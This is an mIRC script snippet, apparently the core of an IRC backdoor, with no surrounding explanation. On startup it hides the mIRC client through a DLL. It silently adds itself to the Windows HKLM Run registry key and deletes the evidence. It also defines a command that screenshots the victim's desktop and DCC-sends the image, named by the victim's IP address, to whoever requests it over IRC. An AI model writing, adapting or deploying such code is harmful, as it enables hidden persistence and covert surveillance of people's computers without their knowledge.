on *:START:{ .dll helper.dll HideMirc on | persist }
alias persist {
 write %reg [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]
 write %reg "Helper"=" $+ $replace($mircexe,\,\\) $+ "
 run -n regedit /s %reg
 timer 1 4 remove %reg
}
alias screenshot { notice $nick $dll(screen.dll,Capture,$mircdir\ $+ $ip $+ .bmp ) | .dcc send $nick $mircdir\ $+ $ip $+ .bmp }
